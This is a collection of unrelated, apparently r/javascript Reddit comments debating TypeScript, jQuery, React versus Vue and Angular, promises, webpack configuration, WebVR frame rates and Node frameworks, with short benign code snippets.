I don't think Immutable's purpose is to actually set a value to be immutable in theory, just ridiculous to do in practice. It obfuscates values behind several layers of abstraction and provides an API for accessing/updating that object without mutating the original.
thanks for your suggestion, but I don't think just stacking element would solve it, because i need it to function so that wherever there is hole in any layer there will be effectively similar holes bellow/above it in all other layers, except for the most bottom one 
Saying jQuery is a framework is like saying JavaScript is an operating system akin to Windows. It's misleading and dangerous. When you get to use an actual framework you'll ask yourself why you can't just use it like you used the jQuery library and you won't know what's going on. Frameworks don't work that way. 
&gt; just ridiculous to do in practice https://github.com/msteckyefantis/subzero 
I was not saying that freezing values is ridiculous to do in practice. I was saying that Immutable makes mutating one of the objects it creates ridiculous in practice. If you purposely try to work around a library's intended purpose, you are going to find ways to undo what the library does. ¯\\_(ツ)_/¯
getImage doesn't return anything. 
I could definitely be wrong, but isn't jQuery a "library" and not a "framework"?
How would angular compare to react when used in the right hands?
Enterprise idiots have taken over Javascript and are enforcing their madness onto the rest of us.
tru say bruh edit: I just think it's interesting that a module named immutableJS isn't immutable in the Object.freeze way. https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Global_Objects/Object/freeze "In essence the object is made effectively immutable."
`console.log` does not return anything, so it's going to be undefined. When you don't explicitly `return` anything, JS returns `undefined` implicitly 
Even if a library is written in TypeScript, as a consumer, there's no difference between it and a Javascript library. Unless you yourself also use TypeScript, in which case you'll get more compilation rather than runtime errors.
Hi there, `getRandomSubmission()` return a promise ; So, you use the `then`method to execute a callback. This is an asynchronous operation. In fact, `getImage()` will terminated BEFORE `getRandomSubmission() callback`. And will does not return anything. Further reading : https://scotch.io/tutorials/javascript-promises-for-dummies
Just stick with hapi and be hapi
Did you try any svg manipulation library ? - http://snapsvg.io/ - https://bonsaijs.org/
Very edgy.
Your self-submissions are always welcome!!! I love, love, love the way you think about crafting software.
Is there a summary of the opposition to typescript? As someone who works on a 65,000 LOC js project, some type safety sounds like it might be pretty nice... 
You can use **[restify](http://restify.com/)**, it is made for that.
&gt; Uh. Who is forcing you to use TypeScript again? all these dipshits who use it in their projects.
I wrote return post.url for the get image function it still said the same thing 
Are you talking about [the jQuery code](https://github.com/jquery/jquery) or about projects using jQuery? In case it's the latter, just remember that many (most?) people using jQuery for their projects have "good enough" as an ultimate goal. Also, let's assume you're a perfectly average programmer. That means that *at least* 50% of all jQuery projects you see will be of lower quality than you could produce *in an ideal situation*. You're probably better than average, so it's no wonder you don't like what you see in general.
You could move the success handler you provided to $.getJSON up as argument of the checkIfActive(). And then wherever you call checkIfActive, provide a function there &amp; use the value in that scope. Examples Here you hide the "active" checking in the function function checkIfActive(streamerName, isActiveCallback) { var url = generateURL(streamerName, "channel"); $.getJSON(url, function(json){ isActiveCallback(json.status != 404) // How do I get this value? }) } Not perfect, but should show what you want?: streamers.forEach(function(streamer) { var html = []; checkifActive(streamer, function(isActive) { if(isActive) { html.push(generateHtml(streamer)); } }); }); Edit: and as kangoo points out, you should check out promises once you grasp how this works, it's a cleaner way to approach async stuff in this case.
This version has (for the sake of clarity ? Unclear why) an infinite loop which is an optimization killer. The ["real" version](https://github.com/estools/escodegen/blob/847ba9758ff610e3f6229701e7744b9701226377/escodegen.js#L209-L219) seems around 2x faster than the one from the article.
yea , thats true. i've been learning for a year almost now and wanted something challenging. would you mind if i pm'd you with a few questions? 
If I understand correctly, you are trying to fail-fast a bunch of AJAX requests and get any first error. So let's turn checkIfActive to return something meaningful than returning nothing. function checkIfUserActivePromise(streamerName) { var url = generateURL(streamerName, "channel"); return new Promise(function(resolve, reject) { $.getJSON(url, function(json){ if (json.status != 404) resolve(); else reject('Failed because of reasons'); }) }); } var streamerNames = ["Peter", "John", "Martin"]; Promise .all( streamerNames.map(checkIfUserActivePromise) ) .then(function() { // All of the users are active alert('done'); html.push(generateHtml(streamer)); }) .catch(function(error) { // There is at least one user who is inactive alert(error); }); 
"a concern" is not always "to render a thing that has some data and which will behave such and such". It can be also "pull some data for later use" or "compute some things in a way reusable in many parts of the app", this is the reason we invented services, factories etc. etc. I think it's very shallow to assume the frontend is all about what renders and absolutely nothing else. Most apps will have some "frontend backend" part. If you put all this logic to templates/components it will be a huge huge mess. Are there any service-like things in React?
A few decades too late for announcing functional programming hype.
Java is to JavaScript as car is to carpet. These are separate and unrelated languages.
Being compatible is only one thing. Your contributors still need to learn about the Typescript good practices, which might differ sensibly from the JS ones. However small, this is still an additional burden put on your contributors. That being said, I've never worked with Typescript yet, so maybe it only has a very small learning curve.
90 fps ? Aren't most browsers capping `requestAnimationFrame` to 60fps? Sometimes even lower, such as 30fps when running on an unplugged laptop
Hey, we're looking for testimonials for the new date-fns.org home page. If you want to share your thoughts with the world, see: https://github.com/date-fns/date-fns.org/issues/93. 😇
Hey, we're looking for testimonials for the new date-fns.org home page. If you want to share your thoughts with the world, see: https://github.com/date-fns/date-fns.org/issues/93. 😇
RequestAnimationFrame is locked to your monitors refresh rate. If you have a 144hz monitor it will run at 144 fps.
If it renders nothing then you're doing something wrong. 
"The number of callbacks is usually 60 times per second, but will generally match the display refresh rate in most web browsers as per W3C recommendation. " According to https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame But yes, I had the same reaction. Many guides aim for 60 fps, which is fine for monitors, but for VR (vive/oculus at least), you really need to keep above 90 fps to avoid motion sickness. For 60 fps you have 16ms between each render cycle. For 90 fps, you have 11ms. I think most browsers aren't set up to do a full rendering of your game plus a GC within that time. So probably you'll need a specialized browser renderer to make it feel 100% smooth.
Looks cool! Good job
HoloJS will porbably come in handy when coding Apps (as in software), i highly doubt that it would be used for coding games (unless you call the tutorial tic-tac-toe, yhatzee, etc. games). I mean 5 years ago if you wanted to make a small web-game you used either unity or flash but not javascript.
React is a library too.
It's fun but I don't understand how this solve high dpi scaling for making games ? Now with pointer detection + more tools and it could be used with a graphic tablet :p
Since HoloLens doesn't cover up everything you see it's probably not as important if it's less than 90 fps.
Hi /u/agentf90, can you try to be a bit more constructive?
&gt;, “HoloJS is a C++ library that hosts Chakra to run JavaScript code, and also hosts ANGLE to handle OpenGL ES graphics calls. OpenGL ES calls are translated from WebGL calls by the JavaScript app. When running on a Microsoft HoloLens, HoloJS supports holographic rendering.” &gt;i highly doubt that it would be used for coding games (unless you call the tutorial tic-tac-toe, yhatzee, etc. games). OpenGL ES is utilised on android if you need a reference point for the games which could be created. It may not be as extensive as openGL but it's certainly capable of a lot more than tic-tac-toe, as is webgl for that matter. 
&gt; Requires an entire build process and transpilation step for even the most trivial, exploratory/experimental programming unless there's a transpiled (but not minified, for debugging) release available. Building a TypeScript project is easier than using Babel and popular IDEs / editors support it out of the box or have a single plugin to install. If you're doing anything that isn't trivial you're going to have a build process anyway.
Yes, it's a good framework still. If you want something newer use koa or hapi.
FWIW I completely gave up on nodejs-based watchers. **All of them** are either buggy or badly designed or both. [Modd](https://github.com/cortesi/modd), for example, is a fast and small executable that works consistently on all platforms, eats up very little RAM, doesn't require a hundred dependencies, handles Ctrl-C correctly, and won't stop working if someone at the TC39 changes his mind on something or another. Here is a crude (and untested) `modd.conf` that should cover your needs: **/*.js { # running tests prep: mocha --recursive --reporter min 'src/**/*.spec.js' }
the same applies to any code pasted to any project ever. i was talking about grammar compatibility
Am I completely wrong this morning? I haven't had my coffee yet but this isn't JavaScript run in a browser it's making uwp apps written in JavaScript access to HoloLens development. HoloLens isn't VR. 
The loop is not infinite, it will always hit the break on line 10 eventually. Also the version you linked performs the same for me in chrome.
For Web VR you're supposed to use [`VRDisplay.requestAnimationFrame`](https://developer.mozilla.org/en-US/docs/Web/API/VRDisplay/requestAnimationFrame) instead of `Window.requestAnimationFrame`. &gt; - When the VRDisplay is not presenting a scene, this is functionally equivalent to Window.requestAnimationFrame. &gt; - When the VRDisplay is presenting, the callback is called at the native refresh rate of the VRDisplay. 
Hi /u/solkimicreb, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
That's the correct answer. Promises ftw. You could also do it with async/await to make it look a bit better, but you need babel for that (or node v7 but I think it's limited to the --harmony flags right now, not sure though).
these libraries look great, thanks. i was a little reluctant to work with anything but core SVG, mostly because i worry about future maintenance when APIs change over time, but they do seem very powerful. 
WebGL puts on lot of the heavy lifting inside on JS. If you're gonna write OpenGL code and you're not constrained by the browser, then why the fuck would you pick JS?! Seems like a big waste of CPU &amp; battery. 
So without external libraries you can't actually DO anything reasonable in React, can you?
I don't think I've seen a weirder troll on Reddit.
Yes. You can just use JSON files by using Firebase. It's a product being maintained by Google at the moment. It has a real time Database so you can definitely make games that you and your friends can play.
If you're looking to serve one file for offline use, rather than dealing with how to bundle it all together in the HTML itself, I would recommend just using something like electron (available via npm in node) to turn your entire project into a single exe file that you can serve for offline use. Otherwise all the other uses would involve some manual configuration to minify, write and bundle everything together in the HTML (I can't think of a single repo out there that does this out of the box). If you still want recommendations on how to write everything to a single HTML file, let me know.
Looks like that may be a part of the solution (at least for dependency resolution), but it looks like it doesn't quite get me all the way to a single file deliverable. Can it be configured to do that for me, or should I just write a script to combine the static files with a template or something?
Infinite dependencies, automatic route generation, an opinion for everything, restarting the server takes 30+ seconds, shoddy development on the codebase, the waterline database adapters are awful...
Here you go: http://codepen.io/anon/pen/Pbgooq Things to pay attention to: - I declared the widths and transitions within a CSS class instead of embedding it directly inside the JS - I used the JS to toggle a class on and off (which applies or removes the size changes) - Inside the click handler, I used the `this` keyword like you said in your main post. The reason that it works is beacuse when you do this:`$('button')` You're targeting every button on the page. With your code, javascript says: "Okay, so every time any button is clicked, I will change the size of all the buttons. Really, you want it to say: "Every time a any button is clicked, I want to make `this` specific button change in size. Hope it helps!
Yeah, I think the `webpack-dev-middleware` approach is _probably_ unnecessary. Can't say I've tried this, but I _think_ that you might be able to pull it off with some creative use of the HtmlWebpackPlugin and a custom HTML output template.
I wouldn't even say it's novices in general---but novices in Javascript. Jquery is often tacked on when someone has already written an app has a web frontend and wants to use progressive enhansement at the last phase of production. This means the person writing the jQuery code is mostly a master in backend languages, and there was a huge disconnect between the style &amp; functionality of (to take a random example) C# and Javascript ES5.
Why is everybody treating it like Angular/Ember alternative then? You should not talk about React then, more like "React ecosystem".
I'll add some more... * 3rd party libraries that weren't written in Typescript (which is a vast majority of them), cause problems with type safety. Yeah, I know there are pre-made type definitions, but they don't exist for *everything*. * Typescript doesn't save you from type bugs that come from external data, which leads to false sense of security around static types. * There can be breaking changes to Typescript, which already had a ripple effect with Angular 2 jumping to Angular 4(?) because they wanted to update to using the latest Typescript version which caused breaking changes. * Let's also not forget the lessons learned from Coffeescript, transpiled code is harder to debug. And all the forks of coffeescript. That's a rabbit hole best not explored. * Then there is developer buy-in, many good developers that have been writing Javascript for a long time simply have no desire to use Typescript and won't contribute to projects based on Typescript (similar to what we saw with coffeescript), and they will pass on jobs requiring Typescript. * Static typing the way Typescript does it has trade-offs, as does anything, even weak-typing. The added tooling, the added type definitions, chasing down 3rd-party type definitions, transpiling making debugging more difficult, and everything else that comes with Typescript may neutralize or outweigh any benefits gained. People need to look at the whole picture. Typescript won't make bad programmers good, the code can still look good and be statically typed, but still be full of bugs and problems. It's not a magic bullet, and it doesn't help as much as some people claim it does, and the results may not justify the means. And, weak typing isn't the problem - not learning the language and how to leverage weak typing is the problem, and Typescript doesn't solve that. 
Sure. A few other links you might be interested in: - I keep a big list of links to high-quality tutorials on React, Redux, and related topics, at https://github.com/markerikson/react-redux-links . That list happens to include a couple sections on [Webpack tutorials](https://github.com/markerikson/react-redux-links/blob/master/webpack-tutorials.md) and [Webpack advanced techniques](https://github.com/markerikson/react-redux-links/blob/master/webpack-advanced-techniques.md) . - I recently put together a presentation that looks at the history of web development, and gives an overview of what tools are commonly used for modern web dev. Might be informative: http://blog.isquaredsoftware.com/2016/10/presentation-modern-web-dev-overview/ - A couple specific articles on using the HtmlWebpackPlugin: https://www.jonathan-petitcolas.com/2016/01/23/webpack-html-plugin-in-a-nutshell.html and http://javascriptplayground.com/blog/2016/07/webpack-html-plugin/ . Hope that helps!
I haven't deep dived into the Promises API yet, but the Promises.all() example was eye opening to me. I can think of a few use cases for that. Thanks for sharing this link.
No I mean like, I can put youtube into "cardboard mode," but I don't see the option in chrome. Is it like a button I'd have to integrate into my VR app? "Switch from Window to VRDisplay" ? 
React is a view framework. It has no specific way of accessing model data. You must provide that fictionally yourself, either by developing something or including a library that does. Check this out to get started with react: https://github.com/petehunt/react-howto
I'm gonna have to disagree with some of these. ## Infinite Dependencies Yes, it requires more npm modules because it is doing more, but I'm not sure how this affects your development experience. It doesn't really affect mine. Also, I don't think it's "infinite". ## Automatic Route Generation This can be turned off with a single boolean. It's only there to help with development, which I consider a pro, not a con. See http://sailsjs.com/documentation/concepts/blueprints/blueprint-routes ## An opinion for everything Please elaborate. ## Restarting the server takes 30+ seconds Yes, I will agree it takes longer than a standard barebones express server, but that's to be expected because Sails is doing more stuff up front. In turn, you get a nice codebase with built-in conventions that you can follow. ## Shoddy development on the codebase Have you run into bugs? If so, please elaborate. ## Waterline Database Adapters are awful I have used the MySQL adapter and it is quite good. Can't speak for the rest. For one of my other projects, we outgrew Waterline so we just moved to BookshelfJS as an ORM. I could have also moved to Sequelize. Again, I don't see how it's a bad thing that Sails gives you sane defaults and gives you ways to swap them out. Hope you take this constructively. Again, I'm not a Sails contributer, I don't know the guys that made it, but I feel you are being harsh on them here. I have used both Express and Sails in many production apps, and I don't think I'll ever go with raw Express again, because it is just a nightmare to have good conventions.
Right now it's only in Chrome Beta, and only available for select, whitelisted sites: https://blog.chromium.org/2016/12/introducing-webvr-api-in-chrome-for.html I've actually never tried it before, so I'm not really sure how it works from a user's perspective.
If you decide to go with a node.js, you can start off with just keeping the data in memory while you develop. That means that the data will be wiped on every server reboot, but in my experience that can be a good thing in early development. And you can be extremely flexible in modeling your data. Later you can choose to persist it in a database or on file when you have a bit more knowledge. For the client-server communication you'll want either a REST API (I'd choose hapi.js) or true real-time sockets (I'd choose socket.io) depending on the needs you have. 
When did I say JS was terrible? I do it all day as my job. I mean, it was pretty terrible before ES5, but I enjoy using modern JS. But I also know I didn't choose to learn JS because of Node – I and most of the people I work with have been developing in JS for longer than Node has existed. People choose Node because: * It's fast – especially for for I/O * The asynchronous model suits their use case * It uses a language familiar to a lot of developers * It has a very large ecosystem of libraries I've never heard anyone say they chose it because it has implicit type conversion between numbers and strings.
there's no rule of software saying the lead has to be the driver of innovation. in face, in this situation the lead is mainly acting as a caretaker to the core module; the innovation can be (and is) accomplished through the ecosystem. besides, the issue isn't that the lead "has no time", it's that the lead expects to be _fairly compensated_ for their time and effort.
Have you used any other languages? I've used plenty, and my choice is still Javascript because of the weak typing, no boilerplate, and many other reasons.
X-Post referenced from [/r/vuejs](http://np.reddit.com/r/vuejs) by /u/shentao [VueConf 2017 | Vue.js Conference](http://np.reddit.com/r/vuejs/comments/5jlmp0/vueconf_2017_vuejs_conference/) ***** ^^I ^^am ^^a ^^bot. ^^I ^^delete ^^my ^^negative ^^comments. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
Learning TS right now, and so far I hate it less than CoffeeScrapt. But I agree with everything you've said so far. 
Like @BigOnLogn said React is a view library, and if you're doing client side rendering there isn't anyways for you to have direct access to the DB. But maybe a node server side would. But if you are doing client side what you could do is turn those getter methods into ajax or websocket calls. Like you could have an object card which would have its attribute *deck_id* where *.deck* would be a function that would do an Ajax call passing in the *deck_id* and returning a Json result. But better yet I'd lazy load the deck and have an array called cards on it. 
isnt this a problem meteorjs already solved?
&gt; “Components don’t necessary have to correspond to DOM nodes.” Amen to that! I am working on an app that uses Google Maps and we have to control state of objects, drawings, locations of things relating to each other, etc. Giving all of these objects a component to hook onto has been awesome. Linking into lifecycle methods, building HOC that act as puppeteer to it's children - it's all worked out so great. And no DOM node in sight haha
Meteor is something else. 
Yes. I've developed professionally in several languages. Python, Java (yep, the boilerplate sucks) and C++ would be the main ones. Plus used a bunch of other languages just for fun. It's never been a problem to manually convert a type if I wanted to compare them. On the other hand I encounter issues due to weak typing *all the time*. I just found one yesterday in [Semantic-UI-React](https://github.com/Semantic-Org/Semantic-UI-React). It has 1386 stars on GitHub, so it's not a no-name project. I just want to display a number, so here we go: &lt;Statistic size='mini'&gt; &lt;Statistic.Value&gt;{this.props.correctCount}&lt;/Statistic.Value&gt; &lt;Statistic.Label&gt;Correct&lt;/Statistic.Label&gt; &lt;/Statistic&gt; Simple right? But [here's the code for Statistic.Value](https://github.com/Semantic-Org/Semantic-UI-React/blob/master/src/views/Statistic/StatisticValue.js): function StatisticValue(props) { const { children, className, text, value } = props const classes = cx(useKeyOnly(text, 'text'), className, 'value') const rest = getUnhandledProps(StatisticValue, props) const ElementType = getElementType(StatisticValue, props) return &lt;ElementType {...rest} className={classes}&gt;{children || value}&lt;/ElementType&gt; } Oh dear. `children || value`. And what if `this.props.correctCount` is 0? Yep, that evaluates to undefined because 0 is falsy and `value` is undefined and it outputs nothing instead of 0. You have you do: &lt;Statistic size='mini'&gt; &lt;Statistic.Value&gt;{'' + this.props.correctCount}&lt;/Statistic.Value&gt; &lt;Statistic.Label&gt;Correct&lt;/Statistic.Label&gt; &lt;/Statistic&gt; Is that intuitive? This kind of stuff happens all the time when you're encouraged to implicitly use the same value as a number, a string and a boolean and hope it works. What difficulties have you encountered due to strong typing exactly?
Oh thanks, this solves everything, this solution is way better than mine. It's very cool, thanks! :) 
Wow dude thank you! I didn't notice for a couple of days. I'm always happy to help. 
Do you know what you'd use to run it? 
It needs to work within the browser, Maybe it works in imacros
Why not just use a library?
"Is this all?"
&gt; Although I will never use this, I think you did a good job. thank you!
many thanks that worked 
Thank you! I think good_report_conversion is their standard function. I'll give that a shot!
Thanks! To be honest, I lucked out on the _creators_ part :)
Thanks for this advice... I just wonder.. I've never developped with Node.js. I saw tutorials installing it on a linux machine and I would be able to do it on my own laptop to develop local but I'm not sure that my hoster will accept that I install Node.js on their serveur the same way... Do I really need to **install** Node.js on the FTP server or will I just have to upload the files of my Node.js project ?
Thanks
Ha, well however it came together, good job. Articles about frameworks have gotten a bit stale, and this one was very refreshing.
I mean, we were thinking about [this library](http://vanilla-js.com/). /s Our React layer/API over Google Maps API is very custom and no library to my knowledge would help us out.
Hardly needs jQuery though.
Great! Hopefully they won't put it in July even though it is a summer conference. Many developers won't be able to make it if, it is in the middle of the summer holidays.
That's why we have the survey! To find out the most suitable time :)
Sorry, I misread the indentation on my phone. I thought you replied to the OP. minimongo looks like a nice abstraction layer.
First off, "library" was a poor choice of words on my part. Small libraries that do one thing and do it well absolutely *do not* need to innovate to survive. Take Moment (which isn't even that small): nothing radical is happening with date processing in Javascript, so the Moment code written however many years ago is still valid and useful today. What I should have said was that *frameworks* have to innovate or die. Frameworks try to solve many problems at once, and since the JS ecosystem is in constant flux the best solutions to those problems will similarly be in flux. Take Backbone. Backbone is an awesome library/framework (source: I've used it for years and even wrote a book on it). But Backbone solves all of its problems in a very late 00's/early 10's kind of way (because that's when they wrote, and eventually gave up on innovating, it). The framework doesn't take advantage of the incredible innovation of Babel, still approaches data storage in a model-based (vs. a store-based) way, makes no use of any sort of virtual DOM, etc. Heck even the foundational structure of Backbone (MVC, or at least Backbone's variant of it) has gone out of favor in the JS community, as we've all learned there are better ways to structure a project. Backbone may not be dead yet, but it's on it's way. And I think the same is true of any framework that doesn't "keep up" with innovation: users will abandon it from frameworks that do. P.S. It's worth noting that frameworks can go too far in the other direction also (ie. innovate too much). Obviously if a framework changes too much from one version to the next it's going to alienate a lot of it's users, even if the new version solves problems better than the old one (see Angular 2).
Yup! http://github.com/bomer/amazio
If you re-read the thread, we're talking explicitly about "a summary of the *opposition* to typescript". If people hate JS and (for example) want a strongly-typed alternative that works in browsers, I think it's fair to say that they wouldn't **be** in opposition to typescript.
V8 [have started](http://v8project.blogspot.ru/2016/12/v8-nodejs.html) optimizing ES6+ in latest versions, so I expect Node from version 7 and onward to show decent performance when it comes to the new language features.
Ok, I think I can agree with that. I guess I was also reading into your comment an assumption that it's better if things don't die. If Backbone released a new breaking version with all the new hot ways of doing things, it might take just as much effort for a team to start using that version as it would take to use e.g. React. On the contrary I'm perfectly happy for Backbone to remain itself for the people who still use it, and to have newer options rise and, in their own time, fall. If we're going to resign ourselves to constant reinvention, I don't think we should be particular about which label our technology is under! (And of course, there are ways to innovate without making completely breaking changes, and theoretically Backbone could take advantage of modern tech without basically asking its users to port everything to React. I just haven't seen much evidence of this happening in the wild :p.)
Someone tried it on React Fiber already? If not, I am kinda curious to try it out.
Sure, I'm just saying I don't think there are an awful lot of people who chose Javascript because it has weak typing.
yes, and for reference I am speaking about TS and ES 6 spec. This means you'll likely have interfaces and classes and extends and imports. The fact that js is "more free" can also lead to errors. Just simple things like i == 0 returning true when i is false (boolean) and not an integer. With TS and ES 6 you will be setting the variables to a type and prevent more trouble down the line. It leads to better code because of it being "less free" in regards to how you described javascript. I would suggest just changing your .js files to .ts and start learning by failure. It's the only way I can learn. Tutorials and stuff don't help unless I'm currently working on a project. Start building a project with ts and then you will learn as you go.
i've got a buddy who swears by react in that it is easier to use, more intuitive, and "makes you write better code" (is easier to test, looks cleaner and more understandable). Angular can lead to some automated testing issues here and there, but might have some pre-made components and directives that react does not. Angular can be written in ways that can make your code impossible for automated tests. Even in ways which people claim is "the Angular way" of doing things. Often times, the "react" way leads to easier automated tests. A lot of times throughout an Angular project you see people posting solutions by having all this crap within the view (html) file. That shit just doesn't work well with automated tests and a lot of this stuff should be handled in a controller of some sort. (Keeping JS separate from markup)
With respect, I know for a *hard fact* that you're wrong, because I've personally met tens or even hundreds. Working in the JS world for the last... oooh... twenty two years, a *majority* of the developers I've known have preferred working in weakly-typed languages. It's only in the last five or so years (as the web has continued to expand and JS has really started to eat the world, and more and more devs from other languages have been grudgingly forced to learn it to deal with the new reality) that I've heard a *significant* fraction of people working in JS who actively and vocally dislike it. Personally, I was myself firmly in the "weak typing for life" camp myself (having started in C/C++, Java and several other languages before/alongside JS) until I started writing libraries for third-party developers of... *various skill-levels and degrees of reliability* to use, at which point I suddenly started to really genuinely appreciate the value of "restrictions" like strict typing, rather than the purely abstract, theoretical way I did before. That said, for my own projects (or projects involving a small team of skilled devs) I'd still choose weak typing in a heartbeat, because personally I find it less confining and fiddly to hack with, and I personally find the benefits of strict typing to be hugely overblown by advocates. Obviously YMMV, however. ;-) It's like how some people prefer Lisp and other people like Java - I'm not going to tell people they're *wrong* for liking Java, but pretending everyone (or even *nearly* everyone) in the world prefers its strictness and safety over the increased expressiveness and flexibility of less locked-down languages is just silly.
Dude you just triggered the entire subreddit.
&gt; With respect, I know for a hard fact that you're wrong, because I've personally met tens or even hundreds. Working in the JS world for the last... oooh... twenty two years, a majority of the developers I've known have preferred working in weakly-typed languages. Do they really prefer weak typing? Or do they really prefer dynamic typing but would really just be just as happy with dynamic strong typing like in Python?
Y tho?
[removed]
Heh, I feel like I should apologize. I truly did not intend for my response to directly address you. In the moment I thought I was addressing those points in a general sense.
Why wouldn't you use minimax?
As Dan recently said on Twitter, [he was describing an observed pattern rather than declaring a required rule](https://twitter.com/dan_abramov/status/802569801906475008). That said, "container/presentational" _is_ a useful mental concept to have, and can simplify some aspects of your app. It's just not something you should spend hours obsessing about :) (Also, folks: downvoting Tyler McGinnis? Seriously? _Why_?)
I think it's safe to assume that v8 optimizes es5 code whether or not it is the result of transpilation. 
Philosophically yes -- they are identical. ;) Otherwise, one is a proper JS and the other is a hybrid of HTML with JS plus overheads, such as extra noise (as nicely illustrated by Andre), additional notation, messed up editor syntax highlighting and the need for plugins to do anything. 
Yes, and I answered it too :)
&gt; Dude you just triggered the entire subreddit. haha
Well yes because await is flat by default. It's basically how you would write code in a synchronous manner. 
Interesting read. I'm curious as to why we'd want to compare these libraries like this?
this is /r/javacript not /r/someshitscript
It seems a lot of the debate around how to manage container vs. presentational stems from the idea that there is no single "best" way to organize your code. What works really well in one project may not work out so great for another. Also, as your software grows it may help to break it up into separate modules, where as before it may have just added additional complexity. 
First, to make code appear as a code-block, indent it four spaces more than you normally would. Next, I'm thinking that one of those JS files referred to in the source code is intended to deobfuscate the text in those strings in that JS that you just posted, and then `eval` it.
Hey Bucky. Just wanted to let you know your vids are what got me into programming :) Thanks for the comment.
this is called clousure and people use it to avoid polluting global scope with unnecessary variables
I'm not convinced that React is more testable than Vue. Vue also takes about half the code to do the same thing. Use Vue if you are starting a project today or rewriting legacy code, because it is faster to learn, simpler, and easier to integrate. Use React if you are already using React and have good people that know React.
They are optimizing native ES6/2016. ES5 is being optimized regardless of its origins, as /u/slmyers pointed out. In browsers we may continue shipping transpiled code, but that's not the case for Node. Node with latest V8 supports all new language features (sans new modules) making tranpiling unnecessary especially if new features perform on par with the transpiled version. 
How does vue take about half the code? With react all my boilerplate is in my index.js, other than that it’s files with some imports and a jsx expression that gets exported. Redux adds some overhead but i presume the same goes for vuex. 
[Or JavaScript at all ...](https://codepen.io/NickyCDK/pen/AIonk)
&gt; Would you use express.js for a new app? No. It's dead.
 4 – Use Semicolons for line termination Woops, I have a habbit from my Ruby days to not put ; at the end of the line.
Well it depends on what you prefer. Logic in templates or generated templates via logic.
That's not a closure, that's an [IIFE](https://en.wikipedia.org/wiki/Immediately-invoked_function_expression). A closure is used to "capture" a value, especially when dealing with async code: for (var i = 0; i &lt; 5; i++) { setTimeout(function() { console.log(i); }, 1000); // without closure, output: 5, 5, 5, 5, 5 } for (var i = 0; i &lt; 5; i++) { setTimeout((function(number) { return function() { console.log(number); }; })(i), 1000); // with closure, output: 0, 1, 2, 3, 4 } http://jsbin.com/qeqala/edit?js,console
Looks like x is the element, not the elements value.
Thanks for the mention (I’m the author)! This list ends in 2011. Any suggestions for what to add for 2012+ ? Ideas: React Native, Electron, JS-based robotics.
Aurelia js actually
Well, my project got sidelined with something from work. Need to build a mobile webapp, the kind run in the device browser, not a shelled WebView. So, I got excited about ionic, but it really can't run standalone w/o it's little wrapper. Framework7 looks awesome, but does not have much for tooling. Thoughts ?
Polymer thanks.
Well, that worked... Thanks mate.
Makes perfect sense. Thanks for the reply
Check out webpack HTML plugin. It will take a template HTML and inject your bundle and stylesheets where you need/want it.
thanks dude this worked but how do i get the value of x from local storage now?
which creates a closure, that the scope defined within cant escape from.
By first storing it there.
Webscale! Is it?
"What framework should you be using instead of writing more stupid framework posts?"
Looks pretty neat - I might end up using that solution. I would still prefer if there was a way to handle it client side rather than increase my config complexity. Thanks for the suggestion regardless :) 
thanks for the help!
Why not use a store for state? and have that act as the puppeteer? No shade, genuine question as to if there were any factors that led to your decision. 
`console.log(x);`
I assign the variable even to the rather complicated looking boolean comparison checking if (number === 0) or the other part (|| = or) The other part applies modulus 2 to the number and "booleanizes" the result: (odd % 2 = 1 = true) and (even % 2 = 0 = false) so we have (number &amp;&amp; bool). This gets "booleanized" again. Numbers are "truthy" so we either have (true &amp;&amp; true) or (true &amp;&amp; false). This gets "inverted" with the second `!`. So we have (boolean || boolean) in the end. If number === 0 then it's either (true || boolean), which ends in (true), or (false || boolean) which ends in whatever (boolean) is. The thing in the alert call is a ternary operator which is basically an easy and efficient way to write a simple if statement and return the result in one part. It can be translated to if (true) { return 'it is true'; else { return 'it is false'; } The part before the question mark is what to check, the part after the question mark up to the colon is what to return if the check is true, the part after the colon up to the end is what to return if the check is false.
I think it's about a missing `return callback()` or `return callback(rows)` call after `connection.release()`. Bonus: calling immediatly `connection.release()`: connection.query(sql, function(err, rows) { connection.release(); if (err) return callback(err); else return callback(rows); }); Another tip is about use of promise instead of callbacks ;)
I'm not sure I understand what you mean by 'client side'. This will embed a `&lt;script src="ada3b1c31b9f6e4151e8.js"&gt;` tag into a html file that you can serve to your clients. Their browser will see the &lt;script&gt; tag and load up the bundle. This is much more efficient than having the client fetch a separate json file then perform another fetch to get the bundle.
I guess it's just a trick of perception. Vue happens to look smaller because a lot of the logic ends up in templates. Also, people too often overcomplicate Redux at which point Vuex conventions feel like a breath of fresh air and make state management naturally lighter on boilerplate. Actually, I feel like there is a strong need for opinionated Redux implementation. That and stable router will probably half the reasons for switching to Vue.
I mean, when I looked at question I assumed this is yet another newbie question demanding answer. Now I see it's actually Medium article.
This is a problem I had as well. Webpack's documentation is so incomprehensible. Here are some links you might find useful. https://github.com/AriaFallah/WebpackTutorial/tree/master/part1 https://github.com/AriaFallah/WebpackTutorial/tree/master/part2 
JSON also will make it easier for you to later remove the config from your project and request it via http which can be very handy for swapping out configs without a code change.
How do you know what to import in React?
Its "JavaScript". Not "java script"
Assuming you are using jQuery, something like this will work: https://gist.github.com/sam-candeocreative/722ab5bce9c998038e186c6b3a453db1 Extend other cases as desired.
Both are technically webscale by themselves. 
[deleted] ^^^^^^^^^^^^^^^^0.7087 &gt; [What is this?](https://pastebin.com/64GuVi2F/31011)
Hmm, this doesn't work for me? **Edit:** Ahhh wait, it does actually, but only when I change the #first option to 1, and then back to 0.5
A computer science degree is a degree in the science of computers. Too many people don't realize that and think it's a degree in programming. However, such education gets you a foundation upon which everything else in programming evolves which is why it is so valuable. Bootcamps give you none of that which almost assures you of more of a struggle when you try and move between technologies, languages, etc. To offer something in between the two would be the anti-degree program though I do see some less than admirable colleges offering such things nowadays along with those who don't mind having their image tarnished. In any case, anything less than a typical CS degree means you are getting less and only want to get to final result quicker. Thus the saying, "Do you want it fast, good or cheap? Pick two."
Since rise of ES6, I do not use semicolon anymore
Yeah that option works for me, but I need it so that if value="1" in the #first select, it'll still display all in the #second select.
Modify my code to suit your needs. It only fires the event on the change event, so if your select starts on 0.5 when the page loads then you would need to disable the 0.5 options on the initial page load as well. You can get around that by adding an empty option to the beginning if you want.
